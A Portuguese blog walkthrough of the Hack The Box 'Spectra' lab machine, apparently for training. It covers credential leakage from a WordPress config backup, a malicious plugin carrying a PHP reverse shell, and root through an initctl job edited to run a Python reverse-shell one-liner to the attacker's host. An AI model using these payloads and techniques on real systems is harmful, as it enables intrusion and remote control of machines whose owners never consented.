---
layout: single
title: "Walktrough: HTB Spectra"
namespace: htb-spectra
category: Walkthrough
tags:
  - HackTheBox
  - HTB Easy
  - HTB Linux
date: 2021-06-26 16:00:00
header:
  teaser: https://i.imgur.com/KjpVjtL.png
  og_image: https://i.imgur.com/KjpVjtL.png
redirect_from: /writeup/2021/06/htb-spectra
---

Olá pessoal!

A máquina desta semana será **Spectra**, outra máquina Linux classificada como fácil do [Hack The Box](https://www.hackthebox.eu), criada por [egre55](https://app.hackthebox.eu/users/1190).<!--more-->

:information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
{: .notice--info}

![HTB Spectra](https://i.imgur.com/OqO1ZZh.png){: .align-center}

## Enumeração

Como de costume, iniciamos sempre com um scan rápido utilizando o `nmap` a fim de identificar os serviços publicados nesta máquina.

```bash
$ target=10.10.10.229; nmap -sC -sV -Pn -oA quick $target
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-12 12:57 EST
Nmap scan report for 10.10.10.229
Host is up (0.079s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey:
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.73 seconds
```

### 80/TCP - Serviço HTTP

Ao acessar o serviço publicado na porta 80 TCP, vemos uma página HTML muito simples com uma mensagem e dois links.

Ao inspecionar o código fonte desta página, vemos que estes fazem referência para o dns `spectra.htb`, o qual foi incluído no arquivo hosts local para resolução correta deste nome.

![Spectra HTB - Issue Tracking page](https://i.imgur.com/ady30IK.png){: .align-center}

```html
<h1>Issue Tracking</h1>

<h2>Until IT set up the Jira we can configure and use this for issue tracking.</h2>

<h2><a href="http://spectra.htb/main/index.php" target="mine">Software Issue Tracker</a></h2>
<h2><a href="http://spectra.htb/testing/index.php" target="mine">Test</a></h2>
```

Ao acessar ambos os links, notado que se trata de sites em WordPress, porém apenas o primeiro (*Software Issue Tracker*) estava funcionando corretamente, enquanto o segundo (*Test*), apresentava um erro de conexão com o banco de dados.

![HTB Spectra - Software Issue Tracker](https://i.imgur.com/QRXqNtu.png){: .align-center}

![HTB Spectra - Testing](https://i.imgur.com/lqTri7v.png){: .align-center}

#### WPScan

Para obter mais informações sobre ambos os sites WordPress identificados, executado o WPScan neles utilizando os seguintes parâmetros, embora tenha funcionado apenas para o site principal, uma vez que o segundo não estava em pleno funcionamento.

```bash
wpscan --url <url> -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2>&1 | tee "./wpscan_<url>.txt"
```

Os seguintes pontos foram identificados para o site `main` (*Software Issue Tracking*):

- Versão do WordPress: 5.4.2
- Usuários: administrator

Dando continuidade com a enumeração de forma manual, notei que para o site *Testing*, não há um redirect para o `index.php` por padrão, listando assim o conteúdo da instalação do WordPress, onde podemos identificar um arquivo interessante: **`wp-config.php.save`**.

![image-20210515144447118](https://i.imgur.com/0pPowA4.png){: .align-center}

Como este arquivo não está com a extensão `*.php`, ele não será interpretado pelo servidor assim como os demais e poderemos realizar o seu download, conforme executado via linha de comando abaixo.

```bash
wget http://spectra.htb/testing/wp-config.php.save
```

Inspecionando seu conteúdo, podemos ver as seguintes credenciais para o usuário de banco de dados:

> Username: devtest
>
> Password: devteam01

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'dev' );

...skipping 1 line
define( 'DB_USER', 'devtest' );

/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

Como na enumeração do `nmap` havia sido listado uma instancia de MySQL, mas que não tínhamos acesso de forma não autenticada, agora podemos testar estas credenciais a partir de linha de comando, porém meu endereço IP não está autorizado a se conectar na instância, nos impedindo assim de validar as credenciais

```bash
$ mysql -u devtest -p -h spectra.htb
Enter password:
ERROR 1130 (HY000): Host '10.10.10.10' is not allowed to connect to this MySQL server
```

Uma vez que o reuso de credenciais é algo bastante comum, tentei me autenticar no portal do Wordpress com a senha encontrada e o usuário previamente enumerado e tive o sucesso esperado!

![HTB Spectra - Wordpress](https://i.imgur.com/7k3nxVN.png){: .align-center}

## Aceso inicial

Uma vez que temos acesso ao WordPress com privilégios administrativos, existem diversas maneiras de obter um shell reverso a partir destas permissões, sendo a forma mais comum o upload de um plugin malicioso que retornará um shell reverso para a máquina atacante.

Para esta finalidade existe um módulo do Metasploit Framework chamado [wp_admin_shell_upload](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/unix/webapp/wp_admin_shell_upload.md), que automatiza este processo de forma bem eficiente, porém, se estiver se preparando para a OSCP, que te limita a quantidade de vezes que pode utilizar o framework, para esta atividade simples isso não seria uma boa ideia :smile:.

Então, para criar este plugin, precisamos realizar os seguintes passos:

- Criar um arquivo com o header do plugin. Este header tem que obedecer aos requisitos mínimos conforme documentado em [Header Requirements \| Plugin Developer Handbook \| WordPress Developer Resources](https://developer.wordpress.org/plugins/plugin-basics/header-requirements/). No nosso caso criei o arquivo `evilplugin.php` com o conteúdo listado abaixo.

```php
/**
 * Plugin Name: evilplugin
  * Version: 1.0
  * Author: evilauthor
  * Author URI: http://evilplugin.test.com
  * License: GPL2
  */
```

- Criar outro arquivo com o payload desejado. Neste caso como o objetivo é um shell reverso, fiz uma cópia do [php reverse shell do Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), alterei os detalhes deste e salvei como `exploit.php`. Abaixo evidencio o trecho do script que necessita alteração.

```php
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.10.10';  // CHANGE THIS
$port = 4443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

- Compactar arquivo conforme abaixo

```bash
$ zip evilplugin.zip evilplugin.php exploit.php
  adding: evilplugin.php (deflated 9%)
  adding: exploit.php (deflated 59%)
```
  
- Uma vez criado o arquivo, acessar o portal do WordPress, autenticar com a conta administrativa e acessar, ao lado esquerdo, o menu *Plugins* > *Add New* e, no topo, clicar no botão *Upload Plugin*

![HTB Spectra - Upload evilplugin.zip](https://i.imgur.com/UlBkZNE.png){: .align-center}

- Inicializar o listener de acordo com o payload configurado. No nosso caso vamos iniciar o  netcat conforme linha de comando abaixo

```bash
nc -lnvp 4443
```

- Selecionar o arquivo zip recém-criado e clicar no botão *Install Now*

![HTB Spectra - Installed evilplugin.zip](https://i.imgur.com/sNlvuWi.png){: .align-center}

- Assim que o request for finalizado é importante fazer a requisição para o caminho dos arquivos em que o upload foi realizado. A linha de comando abaixo realiza o request usando `curl`, mas você pode deixar uma aba do browser preparada para realizar um GET nesta mesma URL

```bash
curl -L http://spectra.htb/main/wp-content/plugins/evilplugin/exploit.php
```

Após este procedimento, deveremos receber um shell reverso na máquina conforme abaixo: :smiley:

```bash
$ nc -lnvp 4443
listening on [any] 4443 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.229] 43298
Linux spectra 5.4.66+ #1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7401P 24-Core Processor AuthenticAMD GNU/Linux
 08:41:48 up 4 min,  0 users,  load average: 0.26, 0.31, 0.17
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
nginx@spectra / $ id
id
uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
nginx@spectra / $
```

:bulb: **Dica:** Existem maneiras mais simples de alcançar este mesmo objetivo e ainda assim não utilizar o Metasploit. Uma ferramenta disponível no Github que pode auxiliar nesta tarefa é o [n00py/WPForce: Wordpress Attack Suite (github.com)](https://github.com/n00py/WPForce), que automatiza este e outros processos para exploração de websites em WordPress
{: .notice--info}

## User flag

Após acesso inicial na máquina, iniciada enumeração utilizando o script `linpeas.sh`, onde pude revisar diversas informações, conforme listado abaixo:

- User: **nginx**, sem privilégios específicos (`uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)`)

- Sistema Operacional: **Chromium OS 11**.0_pre399094_p20200824-r6

- Publicação do conteúdo do nginx a partir do diretório `/usr/local/share/nginx/html` vide caminho dos arquivos `wp-config.php` onde as credenciais abaixo foram listadas:

  | site    | Username | Password      |
  | ------- | -------- | ------------- |
  | main    | dev      | development01 |
  | testing | devtest  | devteam01     |

- Users com console, sendo possíveis caminhos de elevação de privilégio, assim como seus privilégios:

```plaintext
[+] Users with console
chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
katie:x:20156:20157::/home/katie:/bin/bash
root:x:0:0:root:/root:/bin/bash

uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
uid=1001(chronos-access) gid=1001(chronos-access) groups=1001(chronos-access)
```

- MySQL  Ver 14.14 Distrib 5.7.20-19, for Linux (x86_64) using  6.3

- Possíveis chaves de SSH para máquina

```plaintext
/usr/share/chromeos-ssh-config/keys/authorized_keys
/usr/share/chromeos-ssh-config/keys/id_rsa
/usr/share/chromeos-ssh-config/keys/id_rsa.pub
```

- Arquivos passwd incomuns, sendo um deles para **autologin** e com a senha **SummerHereWeCome!!** presente

```plaintext
[+] Searching uncommon passwd files (splunk)
passwd file: /etc/autologin/passwd
passwd file: /etc/pam.d/passwd
passwd file: /usr/share/baselayout/passwd

/etc/autologin/passwd
-rw-r--r-- 1 root root 19 Feb  3 16:43 /etc/autologin/passwd
SummerHereWeCome!!
```

- Arquivo `user.txt` no home path da usuária **katie**, enumerado manualmente no que poderia ser visto no diretório de cada um dos usuários logados

Uma vez que encontramos algumas senhas, um usuário inclusive que já tínhamos conhecimento vide enumeração via HTTP, decidi testá-las para os usuários `katie` e `chronos`, tendo sucesso com a seguinte combinação: **katie:SummerHereWeCome!!**

Com acesso neste perfil realizado leitura da flag presente em seu home directory

```bash
katie@spectra ~ $ id
uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
katie@spectra ~ $ cat user.txt
e89d27fe195e9114ffa72ba8913a6130
katie@spectra ~ $
```

## Root flag

já que temos a senha da usuária katie, a primeira coisa a fazer, já que temos sua senha, é verificar se ela possui algum privilégio de sudo, o qual retornou a seguinte entrada

```bash
katie@spectra ~ $ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
katie@spectra ~ $
```

Analisando o binário, o mesmo pode ser utilizado para o controle de jobs na máquina, vide execução do comando abaixo, porém precisaremos acesso para alteração de algum desses jobs de inicialização

```bash
katie@spectra ~ $ /sbin/initctl help
Job commands:
  start                       Start job.
  stop                        Stop job.
  restart                     Restart job.
  reload                      Send HUP signal to job.
  status                      Query status of job.
  list                        List known jobs.

Event commands:
  emit                        Emit an event.

Other commands:
  reload-configuration        Reload the configuration of the init daemon.
  version                     Request the version of the init daemon.
  log-priority                Change the minimum priority of log messages from the init daemon
  show-config                 Show emits, start on and stop on details for job configurations.
  help                        display list of commands
```

Uma vez que a usuária katie é membro do grupo **developers**, decidi buscar por arquivos que este grupo tenha privilégio com base na execução abaixo, aonde foram retornados alguns arquivos na pasta `/etc/init` e que eram listados como jobs pelo `initctl`.

```bash
katie@spectra ~ $ find / -group developers 2>/dev/null
/etc/init/test6.conf
/etc/init/test7.conf
/etc/init/test3.conf
/etc/init/test4.conf
/etc/init/test.conf
/etc/init/test8.conf
/etc/init/test9.conf
/etc/init/test10.conf
/etc/init/test2.conf
/etc/init/test5.conf
/etc/init/test1.conf
/srv
/srv/nodetest.js
katie@spectra ~ $ ls -la /etc/init/test*
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test1.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test10.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test2.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test3.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test4.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test5.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test6.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test7.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test8.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test9.conf
```

Para obter acesso de root, bastou alterar o job executado por um destes arquivos para iniciar um shell reverso para a máquina atacante com acesso privilegiado e assim, obter a flag de root.

Neste caso escolhi o arquivo `/etc/init/test10.conf`, que possuía o conteúdo abaixo e alterei apenas a sua seção script, conforme segundo bloco abaixo.

```bash
katie@spectra ~ $ cat /etc/init/test10.conf
description "Test node.js server"
author      "katie"

start on filesystem or runlevel [2345]
stop on shutdown

script

    export HOME="/srv"
    echo $$ > /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script
```

```bash
# Edited portion
script
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
end script
```

Após edição do arquivo, iniciado listener e executado o comando abaixo com a conta de katie, obtendo o shell reverso e flag

```bash
# At Spectra as Kali
katie@spectra /etc/init $ sudo /sbin/initctl stop test10
initctl: Unknown instance:
katie@spectra /etc/init $ sudo /sbin/initctl start test10
test10 start/running, process 4947
```

```bash
# At attacker machine
$ nc -lnvp 4443
listening on [any] 4443 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.229] 33606
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# cat /root/root.txt
<redacted>
```

Espero que tenham gostado!

Vejo vocês no próximo post :smiley:
